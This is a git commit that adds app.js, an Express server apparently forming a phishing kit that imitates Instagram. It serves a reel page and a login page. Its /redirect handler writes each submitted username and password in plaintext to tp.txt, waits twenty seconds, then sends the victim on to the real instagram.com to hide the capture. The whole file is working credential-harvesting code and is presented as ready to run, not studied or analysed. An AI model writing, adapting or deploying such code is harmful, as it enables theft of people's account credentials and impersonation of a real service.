b9bdb24b7063c11b7ef25518934c7d03a7c6866f
Devansh Sirohi <91769500+honey2438@users.noreply.github.com>
2023-06-15 16:29:19 +0530

    all ready

---
+++ app.js
@@ -0,0 +1,48 @@
+const fs = require('fs');
+var express = require('express');
+var http = require('http');
+var path = require("path");
+var bodyParser = require('body-parser');
+var helmet = require('helmet');
+const port=3000;
+
+var app = express();
+var server = http.createServer(app);
+
+app.use(bodyParser.urlencoded({extended: false}));
+app.use(express.static(path.join(__dirname,'./public')));
+app.use(helmet());
+
+
+app.get('/', function(req,res){
+    res.sendFile(path.join(__dirname,'./public/reel.html'));
+    });
+
+app.get('/login', function(req,res){
+    setTimeout(function(){
+    res.sendFile(path.join(__dirname,'./public/login.html'));
+        }, 1000);
+    });
+    
+app.post('/redirect', function(req,res){
+     let input="";
+     fs.readFile('tp.txt', 'utf8', (err, data) => {
+        if (err) {
+          return;
+        }
+        input=data+"\n"+req.body.username+"="+req.body.password;
+        fs.writeFile('tp.txt',input, (err) => {
+        if (err) throw err;
+      })
+      });
+     
+      setTimeout(function(){
+    res.redirect('http://www.instagram.com');
+        }, 20000);
+  });
+
+
+
+server.listen(port, () => {
+   
+})
